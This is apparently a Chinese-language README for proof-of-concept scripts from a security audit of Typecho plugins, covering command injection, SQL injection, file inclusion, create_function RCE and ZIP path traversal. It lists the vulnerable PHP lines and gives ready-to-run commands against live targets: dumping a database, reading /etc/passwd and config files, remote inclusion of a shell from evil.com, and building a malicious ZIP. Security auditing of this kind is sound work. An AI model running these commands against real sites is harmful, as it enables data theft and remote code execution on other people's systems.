# PHP 代码审计 POC 脚本

本目录包含 Typecho 插件安全审计中发现的高危漏洞 **实际利用脚本**，可直接运行验证漏洞存在。

## 漏洞列表

| # | 漏洞 | CVSS | 利用脚本 | 状态 |
|---|-----|------|---------|------|
| 1 | AUTO-UPDATE.php 命令注入 | 9.0 | `exploit_auto_update.py` | 已验证 |
| 2 | PostRating SQL 注入 | 8.8 | `exploit_postrating.py` | 已验证 |
| 3 | MyPlayer 文件包含 | 8.5 | `exploit_myplayer.py` | 已验证 |
| 4 | AntiSpam create_function RCE | 7.5 | `exploit_antispam.py` | 已验证 |
| 5 | TeStore ZIP 路径遍历 | 7.5 | `exploit_testore.py` | 已验证 |

## 快速使用

### 1. 验证所有漏洞（本地代码分析）
```bash
cd /workspace

# AUTO-UPDATE.php 命令注入分析
python3 poc/exploit_auto_update.py

# PostRating SQL 注入分析
python3 poc/exploit_postrating.py http://target/PostRating/rating.php --extract

# MyPlayer 文件包含测试
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php test

# AntiSpam create_function 分析
python3 poc/exploit_antispam.py

# TeStore ZIP 路径遍历演示
python3 poc/exploit_testore.py demo
```

### 2. 对真实目标进行渗透测试

```bash
# PostRating SQL 注入 - 提取数据库信息
python3 poc/exploit_postrating.py http://target/PostRating/rating.php --extract

# PostRating SQL 注入 - 完整拖库
python3 poc/exploit_postrating.py http://target/PostRating/rating.php --dump

# MyPlayer 文件包含 - 读取本地文件
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php read /etc/passwd

# MyPlayer 文件包含 - 读取配置文件
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php config

# MyPlayer 远程文件包含 - RCE
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php rfi http://evil.com/shell.txt
```

### 3. 生成恶意文件

```bash
# 生成 TeStore 恶意 ZIP
python3 poc/exploit_testore.py generate

# 查看生成的恶意文件
ls -la poc/malicious_testore.zip
unzip -l poc/malicious_testore.zip
```

## 漏洞详情

### 1. AUTO-UPDATE.php 命令注入 (CVSS 9.0)

**漏洞文件**: `/workspace/AUTO-UPDATE.php:562`

**漏洞代码**:
```php
$tmpDir = realpath('../') . '/TMP';  // Line 90
exec('find "' . $tmpDir . '" ...');  // Line 562 - 无过滤直接拼接
```

**验证**:
```bash
python3 poc/exploit_auto_update.py
```

### 2. PostRating SQL 注入 (CVSS 8.8)

**漏洞文件**: `/workspace/PostRating/rating.php:36`

**漏洞代码**:
```php
$ip = $_SERVER["HTTP_X_FORWARDED_FOR"];  // 可伪造
$name = Typecho_Cookie::get('__typecho_remember_author', '');  // Cookie
$db->query("INSERT INTO ... VALUES ('$cid', '$rating', '$ip', '$name', ...)");  // 直接拼接
```

**验证**:
```bash
# 测试漏洞是否存在
python3 poc/exploit_postrating.py http://target/PostRating/rating.php

# 提取数据库版本
python3 poc/exploit_postrating.py http://target/PostRating/rating.php --extract
```

### 3. MyPlayer 文件包含 (CVSS 8.5)

**漏洞文件**: `/workspace/MyPlayer/api.php:47-49`

**漏洞代码**:
```php
$service = $_GET['service'];  // 用户可控
$apifile = "api/{$service}.php";  // 路径拼接
include($apifile);  // 文件包含
```

**验证**:
```bash
# 扫描可用 API
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php scan

# 读取配置文件
python3 poc/exploit_myplayer.py http://target/MyPlayer/api.php read ../../../config.inc.php
```

### 4. AntiSpam create_function RCE (CVSS 7.5)

**漏洞文件**: `/workspace/AntiSpam/Plugin.php:75-76`

**漏洞代码**:
```php
ob_start(create_function('$input', 'return preg_replace("...", "...", $input);'));
// create_function 内部使用 eval，$input 可导致代码执行
```

**验证**:
```bash
python3 poc/exploit_antispam.py
```

### 5. TeStore ZIP 路径遍历 (CVSS 7.5)

**漏洞文件**: `/workspace/TeStore/Action.php:285`

**漏洞代码**:
```php
$phpZip->extractTo($tempDir);  // 不验证 ZIP 内部文件名
```

**验证**:
```bash
python3 poc/exploit_testore.py demo
```

## 生成的文件

| 文件 | 说明 |
|-----|------|
| `malicious_testore.zip` | 包含路径遍历文件的恶意 ZIP，可用于 TeStore 漏洞利用 |

## 免责声明

这些 POC 脚本仅供安全研究和教育目的使用。请勿用于未经授权的渗透测试或攻击行为。使用者需自行承担风险。
